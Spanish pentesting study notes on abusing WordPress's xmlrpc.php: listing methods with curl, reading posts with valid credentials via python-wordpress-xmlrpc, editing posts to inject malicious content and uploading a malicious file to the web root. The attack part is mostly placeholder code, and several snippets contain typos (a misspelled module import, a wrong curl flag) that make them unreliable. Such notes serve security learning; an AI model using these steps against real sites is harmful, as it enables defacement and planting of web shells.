------
- Tags: #teoria #practica #basico 
- ------

# XMLRPC.php 

### El **xmlrpc.php** en Wordpress es un archivo cxon extensión .php que permite realizar tareas remotas por el método conocido como POST en programación, como por ejemplo, publicar o editar artículos o entradas. 

-----

# Abuso de xmlrcp.php

### Cuando nos referimos a abusar del **xmlrpc.php** hacemos alución al uso que podríamos llegar a obtener gracias a este archivo. 

## Listar métodos disponibles 

### Si envíamos como data en una solicitud por POST el siguiente payload (Obtenido de la web oficial de [wordpress](https://codex.wordpress.org/XML-RPC/system.listMethods))

```xml
<methodCall>
  <methodName>system.listMethods</methodName>
  <params></params>
</methodCall>
```

### Con herramientas como curl, podríamos ver en la respuesta del servidor un listado de los metodos que podemos usar para abusar de estos como la enumeración de usuarios, la edición de posts, etc. 

```bash
curl -s -X POST {url} -s '<methodCall><methodName>system.listMethods</methodName><params></params></methodCall>'
```

## Obtener los POSTS de la página

### Para poder obtener los posts de la página y a la par verificar que las credenciales que tenemos que tener sean válidas, podríamos intentar obtener los posts de la web. Para esto podemos hacer uso del modulo **python-wordpress-xmlrpc** para con python hacer uso de un script y obtener los valores que necesitemos.

```bash
pip3 install python-wordpress-xmlrpc
```

###  De esta manera podríamos hacer uso de este modulo para crear un script en python y obtener valores

```python
from wordpress_xmlrpc import Client 
from wordpress_xmlrpc.methods import posts
client = Client('{url_xmlrpc.php}', '{username}', '{password}')
post = client.call(posts.GetPosts())
```

### De esta manera en la variable *post* ahora tendríamos todos los posts publicados. 

```bash
post # Listar los posts
dir(post[0]) # Listar los attributos del primer post 

# Listar atributos
post[0].link
post[0].id
```

## Editar POSTS de la página

### Una vez que tengamos los posts en la página, tal vez exista una vía potencial para cambiar un codigo que se ejecuta en php u otras funcionalidades. 

```python
from wordpress_xmlrpc import Client 
from wordpress_cmlrpc.methods import posts
client = Client('{url_xmlrpc.php}', '{username}', '{password}')
post = client.call(posts.GetPosts())
 
malicious_post = post[0] # Podríamos quedarnos con el post que querramos editar
malicious_content = "{new_malicious_content}" 
malicious_post.content = malicious_content

client.call(posts.EditPost(malicious_post.id, malicious_post)) # A esta función se le debe pasar el identificador del post a modificar y el nuevo post modificado
```

### De esta manera tal vez exista un post en la página el cual ejecute una función en php y haciendo uso de esto podríamos intentar cambiar esto para inyectar nuestros comandos maliciosos. 

## Subir archivos maliciosos

### Otra cosa que podríamos intentar hacer es subir archivos maliciosos al sistema, de esta manera podríamos desplegar en una ruta de la web nuestro propio script malicioso.

```python
from wordpress_xmlrpc import Client
from wordpress_xmlrpc.methods import media 
client = Client('{url_xmlrpc.php}', '{username}', '{password}')

with open("{mcalicious_file_to_upload}", "r") as f:
	filename = f.read()

post_file = {'name':'{filename}','bits':filename,'type':'{content-type}'}

client.call(media.UploadFile(post_file))
```

### De esta manera, si la web esta desplegada bajo la ruta **/var/www/html** en caso de que la subida del archivo sea exitosa, nos arrojara información como el path donde estará alojado este archivo. 

